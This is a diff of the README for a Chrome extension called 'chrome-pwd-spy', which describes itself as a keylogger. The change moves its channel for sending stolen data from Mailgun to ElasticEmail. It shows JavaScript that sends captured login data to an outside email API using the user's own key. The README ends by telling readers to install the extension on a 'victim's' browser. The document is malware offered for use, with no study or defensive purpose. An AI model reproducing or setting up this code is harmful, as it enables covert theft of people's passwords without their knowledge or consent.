@@ -1,24 +1,25 @@
 ### #сhrome-pwd-spy
 
-Simplest keylogger, directly records login data to transactional email (mailgun right now).
+Simplest keylogger, directly records login data to transactional email (elasticemail right now).
 
 ##### how to use ->
 
-*js/background.js:*
+*js/config.js:*
 
 ```javascript
- var body =   {
-	from: 'mailgun@sandboxab04a0cb2f204bb3a60fc5c0500ea941.mailgun.org', //<--- from
-        to : '', //<--- to
-	subject: 'PWD',
-	text: data
+ var config = {
+     'apikey' : '', //<--- Your API key there
+     'subject' : 'PWD',
+     'from': '',  //<--- from
+     'fromName' : 'ElasticEmail',
+     'to' : '', //<--- to
+     'charset': 'utf-8',
+     'encodingType': 'base64'
  };
-
+ 
  var xhr = new XMLHttpRequest();
- xhr.open("POST", "https://api.mailgun.net/v3/<YOUR DOMAIN THERE>/messages", true); //<--- Your mailgun domain there
- xhr.setRequestHeader ("Authorization", "<YOUR API-KEY THERE>"); //<--- Your key there
- xhr.setRequestHeader("Content-Type","application/json");
- xhr.send(JSON.stringify(body));
+ xhr.open('GET', 'https://api.elasticemail.com/v2/email/send?' + generateQuery(obj, data), true);
+ xhr.send();
 ```
 
 Set your credentials, then install extension on your victim's chrome browser and that's it!
